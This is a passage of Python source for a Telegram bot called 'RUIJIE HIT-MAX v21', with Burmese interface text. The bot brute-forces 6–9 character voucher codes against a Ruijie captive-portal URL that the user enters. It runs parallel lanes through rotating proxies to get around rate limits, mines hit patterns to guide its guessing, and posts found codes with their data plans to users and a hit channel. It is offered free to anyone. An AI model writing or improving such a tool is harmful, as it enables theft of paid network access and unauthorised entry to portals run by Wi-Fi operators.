                    await BOT.send_message(CFG.HIT_CHANNEL, f"💸 HIT\n\n`{code}`\n{plan} | {tstr}", parse_mode="Markdown")
                except: pass
        except: pass

# ══════════════════════════════════════════════════════════════════
#  DASHBOARD
# ══════════════════════════════════════════════════════════════════
def build_dash(chat_id, stats, mode, elapsed, total, cluster=None):
    mins = int(elapsed // 60); secs = int(elapsed % 60)
    hrs = int(mins // 60); mins = int(mins % 60)
    t_str = f"{hrs:02d}:{mins:02d}:{secs:02d}" if hrs else f"{mins:02d}:{secs:02d}"

    checked = stats["checked"]; hits = stats["hits"]
    limits = stats["limits"]
    net = max(0, checked - hits - limits)
    speed = int(checked / elapsed * 60) if elapsed > 0 else 0

    def fmt(n):
        if n >= 1_000_000: return f"{n/1_000_000:.2f}M"
        if n >= 1_000: return f"{n/1_000:.2f}K"
        return f"{n:,}"

    m = re.match(r"mix_(\d+)_(\d+)_([lub])", mode)
    if m:
        nL, nN = m.group(1), m.group(2)
        icon = {"l":"🔡","u":"🔠","b":"🔤"}[m.group(3)]
        mode_label = f"{icon} {nL}L+{nN}N"
    else:
        mode_label = mode

    _, bad, work = pool().stats()
    pause = " ⏸" if GUARD.is_paused() else ""

    text = (
        f"⚡ <b>HIT-MAX v21 Optimized</b> ⚡{pause}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🎯 Tried: <b>{fmt(checked)}</b>\n"
        f"🔥 Hits: <b>{fmt(hits)}</b>\n"
        f"⚠️ Limits: <b>{fmt(limits)}</b>\n"
        f"❌ Net: <b>{fmt(net)}</b>\n"
        f"⚡ Speed: <b>{fmt(speed)} c/m</b>\n"
        f"🔄 Proxy: <b>{work}W/{bad}B</b>\n"
        f"📡 Lanes: <b>{CFG.LANES}</b>\n"
        f"🎮 Mode: <code>{mode_label}</code>\n"
    )

    if cluster:
        cl = cluster.get_clusters()
        if cl: text += f"🎯 Clusters: <b>{len(cl)}</b>\n"

    text += "━━━━━━━━━━━━━━━━\n"

    hits_list = success_texts.get(chat_id, [])
    if hits and hits_list:
        text += f"🔥 <b>HIT ({hits})</b> 🔥\n"
        for h in hits_list[-5:]:
            c = h.get("code", "?"); p = h.get("plan", "—"); t = h.get("time","")
            status = h.get("status", "done")
            if status == "fetching" or p == "⏳ Fetching...":
                text += f"⏳ Fetching <code>{c}</code>\n"; continue
            pl = str(p).lower()
            if any(k in pl for k in ("gb","mb","kb")) and t and t not in ("","—","…","Unknown"):
                text += f"💎 <code>{c}</code> 💵 {p}, ⏰ {t}\n"
            else:
                text += f"💎 <code>{c}</code> 💵 {p}\n"
    else:
        text += f"🔥 <b>HIT (0)</b> 🔥\n<i>(no hits yet)</i>\n"

    text += f"\n⏱ {t_str}"
    return text

# ══════════════════════════════════════════════════════════════════
#  HIT EXPORT
# ══════════════════════════════════════════════════════════════════
async def export_hits(chat_id, hits, mode, tried, el, patterns=None):
    if not hits: return
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"hits_{chat_id}_{ts}.txt"
        L = ["═"*58, "💸 RUIJIE HIT-MAX v21 — HITS 💸".center(58), "═"*58, "",
             f"👤 User   : {chat_id}",
             f"📅 Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"🎯 Mode   : {mode}", f"💾 Tried  : {tried:,}",
             f"💸 Hits   : {len(hits)}", f"⏰ Time   : {el:.0f}s",
             f"⚡ Speed  : {(tried/el*60) if el>0 else 0:,.0f} c/m", "", "═"*58, ""]

        if patterns:
            s = patterns.summary()
            if s:
                L.append("📊 PATTERN ANALYSIS")
                L.append(f"   Top Prefixes: {s['prefixes']}")
                L.append(f"   Top Suffixes: {s['suffixes']}")
                L.append("")

        for i, h in enumerate(hits, 1):
            L.append(f"💸 #{i:04d}  {h.get('code','?')}  | {h.get('plan','—')} | {h.get('time','—')} | {h.get('found_at','—')}")

        with open(fn, "w", encoding="utf-8") as f: f.write("\n".join(L))
        with open(fn, "rb") as f:
            await BOT.send_document(chat_id, f, visible_file_name=f"hits_{len(hits)}.txt",
                caption=f"💸 Hits: `{len(hits)}`", parse_mode="Markdown")
        try: os.remove(fn)
        except: pass
    except Exception as e: log.warning(f"[Export] {e}")

# ══════════════════════════════════════════════════════════════════
#  BRUTE LOOP
# ══════════════════════════════════════════════════════════════════
async def brute_loop(chat_id, portal, mode, scan_id, msg):
    success_texts[chat_id].clear()
    total = 10 ** int(mode) if mode in ("6","7","8","9") else None

    codegen = CodeGen(mode)
    codeq = CodeQueue(codegen, size=200_000)

    cluster = ClusterDetector(CFG.CLUSTER_WINDOW, CFG.CLUSTER_MIN_HITS)
    nearhit = NearHitTracker(CFG.NEAR_HIT_RANGE)
    patterns = PatternMiner(CFG.PATTERN_MIN_HITS)
    hitlock = HitLock()

    codeq.near_hit = nearhit
    codeq.pattern_miner = patterns

    stats = {"checked": 0, "hits": 0, "limits": 0}
    start = time.monotonic()

    async def stop_check():
        s = scan_tasks.get(chat_id)
        return not s or s.get("stop") or s.get("scan_id") != scan_id

    await codeq.start()

    lanes = [Lane(i) for i in range(CFG.LANES)]
    st = scan_tasks[chat_id]
    st["lanes"] = lanes
    st["cluster"] = cluster

    lane_tasks = [
        asyncio.create_task(lane_worker(
            l, chat_id, portal, codeq, scan_id, stats,
            cluster, nearhit, patterns, hitlock))
        for l in lanes
    ]

    async def dashboard():
        while True:
            await asyncio.sleep(CFG.DASH_INTERVAL)
            if await stop_check(): return
            try:
                el = time.monotonic() - start
                t = build_dash(chat_id, stats, mode, el, total, cluster)
                await BOT.edit_message_text(
                    t, chat_id=chat_id, message_id=msg.message_id, 
                    parse_mode="HTML", reply_markup=kb_scan_running()
                )
            except: pass

    dash_task = asyncio.create_task(dashboard())

    try:
        while not await stop_check():
            await asyncio.sleep(0.5)
    finally:
        await codeq.stop()
        for t in lane_tasks + [dash_task]:
            if not t.done(): t.cancel()
        await asyncio.gather(*(lane_tasks + [dash_task]), return_exceptions=True)

        el = time.monotonic() - start
        hits = list(success_texts.get(chat_id, []))

        if pending_balance:
            try: await asyncio.gather(*pending_balance, return_exceptions=True)
            except: pass

        if hits:
            try:
                existing = DBX.r_get(str(chat_id))
                codes = {h.get("code") for h in existing}
                for h in hits:
                    if h.get("code") not in codes: existing.append(h)
                DBX.r_save(str(chat_id), existing)
            except: pass

        if stats["checked"] > 0:
            try: DBX.h_add(str(chat_id), mode, len(hits), stats["checked"], el)
            except: pass

        try: await BOT.delete_message(chat_id=chat_id, message_id=msg.message_id)
        except: pass

        sp = stats["checked"] / el * 60 if el > 0 else 0
        fin = (f"🏁 **DONE** 🏁\n━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"💾 Tried : `{stats['checked']:,}`\n💰 Hits  : `{len(hits)}`\n"
               f"⚠️ Limits: `{stats['limits']}`\n⚡ Speed : `{sp:,.0f}` c/m\n"
               f"⏰ Time  : `{el:.0f}s`\n🎮 Mode  : `{mode}`")
        try: await BOT.send_message(chat_id, fin, parse_mode="Markdown")
        except: pass

        notify = bool(DBX.s_get(str(chat_id)).get("notif", 1))
        if notify and hits:
            await export_hits(chat_id, hits, mode, stats["checked"], el, patterns)

        scan_tasks.pop(chat_id, None)

# ══════════════════════════════════════════════════════════════════
#  KEYBOARDS & HANDLERS
# ══════════════════════════════════════════════════════════════════
def kb_home(uid=None):
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("🔗 Portal", callback_data="m_portal"),
        InlineKeyboardButton("🌐 Proxy", callback_data="m_proxy"),
        InlineKeyboardButton("⚙️ Mode", callback_data="m_modes"),
        InlineKeyboardButton("🛑 Stop", callback_data="m_stop"),
    )
    return k

def kb_modes():
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("6️⃣ 6 Digit", callback_data="mode_6"),
        InlineKeyboardButton("7️⃣ 7 Digit", callback_data="mode_7"),
        InlineKeyboardButton("8️⃣ 8 Digit", callback_data="mode_8"),
        InlineKeyboardButton("9️⃣ 9 Digit", callback_data="mode_9"),
        InlineKeyboardButton("🔡 low 6", callback_data="mode_low6"),
        InlineKeyboardButton("🔡 low 7", callback_data="mode_low7"),
        InlineKeyboardButton("🔤 mix 6", callback_data="mode_mix6"),
        InlineKeyboardButton("🔤 mix 7", callback_data="mode_mix7"),
    )
    k.add(InlineKeyboardButton("⬅️ Back", callback_data="home"))
    return k

def kb_back():
    return InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="home"))

def kb_scan_running():
    k = InlineKeyboardMarkup()
    k.add(InlineKeyboardButton("🛑 Stop (ရပ်မည်)", callback_data="m_stop"))
    return k

@BOT.message_handler(commands=['start'])
async def c_start(m):
    uid = str(m.chat.id)
    name = m.from_user.first_name or m.from_user.username or "User"
    DBX.bu_register(uid, m.from_user.username or "", name)
    if DBX.bu_is_banned(uid): return await BOT.reply_to(m, "🚫 ပိတ်ထားပါသည်။")
    txt = f"⚡ **RUIJIE HIT-MAX v21** ⚡\n━━━━━━━━━━━━━━━━━━━━━\n\n👤 {name}\n🆔 `{uid}`\n\n✅ Free For Everyone"
    await BOT.send_message(m.chat.id, txt, reply_markup=kb_home(uid), parse_mode="Markdown")

@BOT.message_handler(commands=['key'])
async def c_key(m):
    await BOT.reply_to(m, "ℹ️ ယခုရိုဘော့ဒ်တွင် Key ထည့်ရန် မလိုတော့ပါ။ လူတိုင်း အလွတ်သုံးနိုင်ပါသည်။")

@BOT.message_handler(commands=['portal'])
async def c_portal(m):
    uid = str(m.chat.id)
    args = m.text.split(maxsplit=1)
    if len(args) < 2: return await BOT.reply_to(m, "🔗 `/portal URL`", parse_mode="Markdown")
    url = args[1].strip()
    if not url.startswith(("http://","https://")): return await BOT.reply_to(m, "❌ Bad URL")
    user_portal[uid] = url
    await BOT.reply_to(m, "✅ Saved", reply_markup=kb_modes())

@BOT.message_handler(commands=['scan'])
async def c_scan(m):
    uid = str(m.chat.id)
    if uid not in user_portal: return await BOT.reply_to(m, "🔗 `/portal URL` first")
    if m.chat.id in scan_tasks and not scan_tasks[m.chat.id].get("stop"):
        return await BOT.reply_to(m, "⚠️ Running")
    mode = DBX.s_get(uid).get("mode", "6")
    scan_id = str(uuid.uuid4())
    msg = await BOT.send_message(m.chat.id, "🚀...", parse_mode="HTML", reply_markup=kb_scan_running())
    scan_tasks[m.chat.id] = {"scan_id": scan_id, "stop": False, "checked": 0, "start_ts": time.monotonic()}
    asyncio.create_task(brute_loop(m.chat.id, user_portal[uid], mode, scan_id, msg))

@BOT.message_handler(commands=['stop'])
async def c_stop(m):
    st = scan_tasks.get(m.chat.id)
    if st: st["stop"] = True
    await BOT.reply_to(m, "🛑 Stopping...")

@BOT.message_handler(func=lambda m: str(m.chat.id) in user_states)
async def handle_user_inputs(m):
    uid = str(m.chat.id)
    state = user_states.get(uid)
    text = m.text.strip()
    
    if state == "waiting_portal":
        user_states.pop(uid, None)
        if not text.startswith(("http://", "https://")):
            return await BOT.reply_to(m, "❌ မှန်ကန်သော Portal URL မဟုတ်ပါ။ `http://` သို့မဟုတ် `https://` ဖြင့် စတင်ပါ။", parse_mode="Markdown")
        user_portal[uid] = text
        DBX.s_put(uid, conn_mode="direct")
        await BOT.reply_to(m, f"✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ:\n`{text}`", parse_mode="Markdown", reply_markup=kb_home(uid))
        
    elif state == "waiting_proxy":
        user_states.pop(uid, None)
        lines = text.splitlines()
        added = pool().add_many(lines)
        DBX.s_put(uid, conn_mode="proxy")
        total_p, bad_p, work_p = pool().stats()
        await BOT.reply_to(m, f"✅ Proxy များ ထည့်သွင်းပြီး Proxy Mode သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ!\n\n➕ ထည့်သွင်းနိုင်ခဲ့သည် - `{added}` ခု\n🌐 စုစုပေါင်း Proxy - `{total_p}` ခု", parse_mode="Markdown", reply_markup=kb_home(uid))

@BOT.callback_query_handler(func=lambda c: True)
async def on_cb(call):
    uid = str(call.message.chat.id); d = call.data
    await BOT.answer_callback_query(call.id)

    if d == "home":
        user_states.pop(uid, None)
        return await BOT.edit_message_text(f"⚡ **HIT-MAX v21** ⚡\n🆔 `{uid}`",
            chat_id=uid, message_id=call.message.message_id, reply_markup=kb_home(uid), parse_mode="Markdown")

    if d == "m_modes":
        return await BOT.edit_message_text("⚙️ **Mode ရွေးချယ်ရန်**", chat_id=uid, message_id=call.message.message_id,
            reply_markup=kb_modes(), parse_mode="Markdown")

    if d == "m_portal":
        user_states[uid] = "waiting_portal"
        return await BOT.edit_message_text(
            "🔗 **Portal URL ထည့်သွင်းရန်**\n\nကျေးဇူးပြု၍ Portal URL ကို ဤ Chat ထဲသို့ ပေးပို့ပါ (ဥပမာ - `https://portal-as.ruijienetworks.com`):",
            chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=kb_back()
        )

    if d == "m_proxy":
        user_states[uid] = "waiting_proxy"
        total_p, bad_p, work_p = pool().stats()
        return await BOT.edit_message_text(
            f"🌐 **Proxy ထည့်သွင်းရန်**\n\nကျေးဇူးပြု၍ Proxy များကို ဤ Chat ထဲသို့ ပေးပို့ပါ (IP:Port ပုံစံဖြင့် တစ်ကြောင်းချင်း သို့မဟုတ် စာရင်းလိုက် ပေးပို့နိုင်သည်):\n\nလက်ရှိ Proxy အရေအတွက် - `{total_p}` ခု",
            chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=kb_back()
        )

    if d.startswith("mode_"):
        m = d.replace("mode_","")
        DBX.s_put(uid, mode=m)
        if uid not in user_portal:
            return await BOT.edit_message_text(f"✅ Mode: `{m}`\n\n🔗 ကျေးဇူးပြု၍ Portal ခလုတ်ကို နှိပ်၍ Portal URL အရင်ထည့်ပါ။",
                chat_id=uid, message_id=call.message.message_id, reply_markup=kb_home(uid), parse_mode="Markdown")
        try: await BOT.delete_message(chat_id=uid, message_id=call.message.message_id)
        except: pass
        scan_id = str(uuid.uuid4())
        msg = await BOT.send_message(call.message.chat.id, f"🚀 `{m}`...", parse_mode="HTML", reply_markup=kb_scan_running())
        scan_tasks[call.message.chat.id] = {"scan_id": scan_id, "stop": False, "checked": 0, "start_ts": time.monotonic()}
        asyncio.create_task(brute_loop(call.message.chat.id, user_portal[uid], m, scan_id, msg))

    if d == "m_stop":
        st = scan_tasks.get(call.message.chat.id)
        if st: st["stop"] = True
        user_states.pop(uid, None)
        return await BOT.edit_message_text("🛑 ရပ်တန့်လိုက်ပါပြီ။", chat_id=uid, message_id=call.message.message_id, reply_markup=kb_back())

# ══════════════════════════════════════════════════════════════════
#  SERVER & MAINTENANCE LOOPS
# ══════════════════════════════════════════════════════════════════
async def handle(req): return web.Response(text="⚡ v21 alive")

async def web_srv():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("BOT_PORT", 8099))
    await web.TCPSite(runner, "0.0.0.0", port).start()

async def gc_loop():
    while True:
        await asyncio.sleep(60)
        gc.collect()

async def main():
    print("=" * 64)
    print("  ⚡ RUIJIE HIT-MAX v21 — OPTIMIZED (OPEN)")
    print("=" * 64)

    await init_connector()
    pool()
    asyncio.create_task(gc_loop())
    asyncio.create_task(web_srv())

    backoff = 5
    while True:
        try:
            await BOT.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            log.warning(f"[Poll] {e}")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

if __name__ == "__main__":
    asyncio.run(main())
